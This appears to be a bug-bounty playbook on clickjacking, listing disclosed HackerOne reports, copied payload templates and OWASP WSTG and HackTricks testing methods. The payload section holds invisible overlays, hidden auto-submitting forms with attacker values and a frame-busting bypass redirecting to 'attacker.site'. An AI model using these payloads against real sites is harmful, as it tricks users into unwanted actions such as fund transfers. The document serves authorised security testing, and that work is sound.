# Real-World Playbook — Clickjacking / UI Redress

**Class:** `clickjacking` · **Coverage-matrix tier:** 1 · **Hunter2:** /client-side · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed Clickjacking / UI Redress reports peak at **$3,000**. Rewarded across: Automattic, BOHEMIA INTERACTIVE a.s., Mail.ru, Passit, PortSwigger Web Security, Rocket.Chat, Shipt, TikTok.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **RCE of Burp  Scanner / Crawler via Clickjacking** — PortSwigger Web Security, $3,000 · 171👍 · [1274695](https://hackerone.com/reports/1274695)
- **Twitter Periscope Clickjacking Vulnerability** — X / xAI, $1,120 · 143👍 · [591432](https://hackerone.com/reports/591432)
- **Clickjacking Periscope.tv on Chrome** — X / xAI, $560 · 11👍 · [198622](https://hackerone.com/reports/198622)
- **Clickjacking Vulnerability Can Leads To Delete Developer APP** — TikTok, $500 · 26👍 · [1416612](https://hackerone.com/reports/1416612)
- **Clickjacking Vulnerability In Whole Page Ads Tiktok** — TikTok, $500 · 7👍 · [1418857](https://hackerone.com/reports/1418857)
- **Modifying application settings via clickjacking on o2.mail.ru** — Mail.ru, $150 · 13👍 · [355774](https://hackerone.com/reports/355774)
- **Clickjacking at ylands.com** — BOHEMIA INTERACTIVE a.s., $80 · 22👍 · [405342](https://hackerone.com/reports/405342)
- **Highly wormable clickjacking in player card** — X / xAI, $0 (disclosed) · 134👍 · [85624](https://hackerone.com/reports/85624)
- **Clickjacking on donation page** — WordPress, $0 (disclosed) · 90👍 · [921709](https://hackerone.com/reports/921709)
- **Clickjacking in main domain https://topechelon.com/** — Top Echelon Software, $0 (disclosed) · 80👍 · [2964441](https://hackerone.com/reports/2964441)
- **Viral Direct Message Clickjacking via link truncation leading to capture of both Google credentials & installation of malicious 3rd party Twitter App** — X / xAI, $0 (disclosed) · 64👍 · [643274](https://hackerone.com/reports/643274)
- **Double Clickjacking Attack on WakaTime OAuth Authorization Flow at https://wakatime.com/oauth/authorize** — WakaTime, $0 (disclosed) · 57👍 · [3287060](https://hackerone.com/reports/3287060)
- **Sensitive Clickjacking on admin login page.** — Shipt, $0 (disclosed) · 55👍 · [389145](https://hackerone.com/reports/389145)
- **Stealing User emails by clickjacking cards.twitter.com/xxx/xxx** — X / xAI, $0 (disclosed) · 49👍 · [154963](https://hackerone.com/reports/154963)
- **Clickjacking vkpay** — VK.com, $0 (disclosed) · 44👍 · [374817](https://hackerone.com/reports/374817)
- **[api.tumblr.com] Exploiting clickjacking vulnerability to trigger self DOM-based XSS** — Automattic, $0 (disclosed) · 31👍 · [953579](https://hackerone.com/reports/953579)
- **URL is vulnerable to clickjacking  https://app.passit.io/** — Passit, $0 (disclosed) · 28👍 · [530008](https://hackerone.com/reports/530008)
- **Clickjacking in the admin page** — Rocket.Chat, $0 (disclosed) · 21👍 · [728004](https://hackerone.com/reports/728004)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
<div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
  <a href="malicious-link">Click me</a>
</div>
```
```
      <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
```
```
    <button onclick="submitForm()">Click me</button>
```
```
    <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
    <!-- Hidden form fields -->
    </form>
```
```
    <button onclick="submitForm()">Click me</button>
    <form action="legitimate-site" method="POST" id="hidden-form">
      <!-- Hidden form fields -->
    </form>
    <script>
      function submitForm() {
        document.getElementById('hidden-form').submit();
      }
    </script>
```
```
  <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
  <input type="hidden" name="username" value="attacker">
  <input type="hidden" name="action" value="transfer-funds">
  </form>
```
```
  function submitForm() {
    document.getElementById('hidden-form').submit();
  }
```
```
Header always append X-Frame-Options SAMEORIGIN
```
```
<meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
```
```
    <iframe src="http://target site" security="restricted"></iframe>
```
```
    <iframe src="http://target site" sandbox></iframe>
```
```
<h1>www.fictitious.site</h1>
<script>
    window.onbeforeunload = function()
    {
        return " Do you want to leave fictitious.site?";
    }
</script>
<iframe src="http://target site">
```
```
<?php
    header("HTTP/1.1 204 No Content");
?>
```
```
<script>
    var prevent_bust = 0;
    window.onbeforeunload = function() {
        prevent_bust++;
    };
    setInterval(
        function() {
            if (prevent_bust > 0) {
                prevent_bust -= 2;
                window.top.location = "http://attacker.site/204.php";
            }
        }, 1);
</script>
<iframe src="http://target site">
```
```
<script>
    if ( top != self )
    {
        top.location=self.location;
    }
</script>
```
```
<iframe src=”http://target site/?param=<script>if”>
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Clickjacking

|ID          |
|------------|
|WSTG-CLNT-09|

#### Summary

Clickjacking, a subset of UI redressing, is a malicious technique whereby a web user is deceived into interacting (in most cases by clicking) with something other than what the user believes they are interacting with. This type of attack, either alone or in conjunction with other attacks, could potentially send unauthorized commands or reveal confidential information while the victim is interacting with seemingly-harmless web pages. The term clickjacking was coined by Jeremiah Grossman and Robert Hansen in 2008.

A clickjacking attack uses seemingly-harmless features of HTML and JavaScript to force the victim to perform undesired actions, such as clicking an invisible button that performs an unintended operation. This is a client-side security issue that affects a variety of browsers and platforms.

To carry out this attack, an attacker creates a seemingly-harmless web page that loads the target application through the use of an inline frame (concealed with CSS code). Once this is done, an attacker may induce the victim to interact with the web page by other means (through, for example, social engineering). Like other attacks, a common prerequisite is that the victim is authenticated against the attacker’s target application.

*Figure 4.11.9-1: Clickjacking inline frame illustration*

The victim surfs the attacker's web page with the intention of interacting with the visible user interface, but is inadvertently performing actions on the hidden web page. Using the hidden page, an attacker can deceive users into performing actions they never intended to perform through the positioning of the hidden elements in the web page.

*Figure 4.11.9-2: Masked inline frame illustration*

The power of this method is that the actions performed by the victim are originated from the hidden but authentic target web page. Consequently, some of the anti-CSRF protections deployed by the developers to protect the web page from CSRF attacks could be bypassed.

#### Test Objectives

- Assess application vulnerability to clickjacking attacks.

#### How to Test

As mentioned above, this type of attack is often designed to allow an attacker to induce users’ actions on the target site, even if anti-CSRF tokens are being used.

##### Load Target Web Page on a HTML Interpreter Using HTML iframe Tag

Sites that do not protected against frame busting are vulnerable to clickjacking attack. If the `https://www.target.site` web page is successfully loaded into a frame, then the site is vulnerable to Clickjacking. An example of HTML code to create this testing web page is displayed in the following snippet:

```htmls
    <html>
        <head>
            <title>Clickjack test web page</title>
        </head>
        <body>
            <iframe src="https://www.target.site" width="400" height="400"></iframe>
        </body>
    </html>
```

##### Test Application against Disabled JavaScript

Since these types of client-side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.

There are few deactivation techniques that can be used with frames. More in depth techniques can be found on the [Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).

##### Sandbox Attribute

With HTML5 a new attribute called "sandbox" is available. It enables a set of restrictions on content loaded into the iframe.

Example:

```html
<iframe src="https://example.org" sandbox></iframe>
```

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### Clickjacking


#### What is Clickjacking

In a clickjacking attack, a **user** is **tricked** into **clicking** an **element** on a webpage that is either **invisible** or disguised as a different element. This manipulation can lead to unintended consequences for the user, such as the downloading of malware, redirection to malicious web pages, provision of credentials or sensitive information, money transfers, or the online purchasing of products.<sup>[[1]](#references)</sup>

##### Prepopulate forms trick

Sometimes it is possible to **prepopulate form fields with query parameters when loading a page**. An attacker may combine this behavior with clickjacking so the victim only has to press the submit button.

##### Populate form with Drag\&Drop

If a victim must **fill a form** with attacker-chosen data, a drag-and-drop interaction can write controlled text into the framed form without asking the victim to type it directly.<sup>[[9]](#references)</sup>

##### Basic Payload

```css
<style>
   iframe {
       position:relative;
       width: 500px;

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- Framing a state-change with no CSRF token → 1-click account change
- Only meaningful on sensitive authed actions — prove impact

## Hunter2 wiring
- **Run:** `/client-side`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
